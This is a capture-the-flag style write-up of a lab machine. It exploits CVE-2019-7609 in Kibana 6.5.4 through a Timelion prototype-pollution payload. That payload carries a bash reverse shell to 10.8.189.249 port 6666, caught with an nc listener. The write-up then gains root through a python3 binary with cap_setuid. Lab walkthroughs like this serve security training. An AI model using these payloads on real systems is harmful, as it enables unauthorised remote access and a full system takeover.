2. Enumeration
#

We see this website at port 80.

We have a website called Kibana, Kibana is the visual framework of Elasticsearch, and from it we will be able to consult the data that we have ingested in a more visual way.

We can see the version and search for vulnerabilities or exploits on the internet.

Kibana 6.5.4

We found a CVE (Vulnerability).

CVE-2019-7609
#

In the Repo we can see how the vulnerability is exploited.

In the timelion section of kibana, we execute:

.es(*).props(label.__proto__.env.AAAA='require("child_process").exec("bash -c \'bash -i>& /dev/tcp/10.8.189.249/6666 0>&1\'");//')
.props(label.__proto__.env.NODE_OPTIONS='--require /proc/self/environ')

If you look closely at the code you can see that there is a Oneliner that gives us a shell, changes the IP and tests.

We listen:

nc -nlvp 6666

Let’s go to the canvas section, as the cve tells us.

We already have a shell.

3. Privilege Escalation
#

As we had seen in the first website, it talked about capabilities.

Python Capabilitie
#

Let’s see the capabilities of the victim machine:

getcap -r / 2>/dev/null

/home/kiba/.hackmeplease/python3 = cap_setuid+ep     
/usr/bin/mtr = cap_net_raw+ep
/usr/bin/traceroute6.iputils = cap_net_raw+ep
/usr/bin/systemd-detect-virt = cap_dac_override,cap_sys_ptrace+ep

We found something obvious, /home/kiba/.hackmeplease/python3.

Python Capabilities GTFObins

/home/kiba/.hackmeplease/python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'

We are already Root.
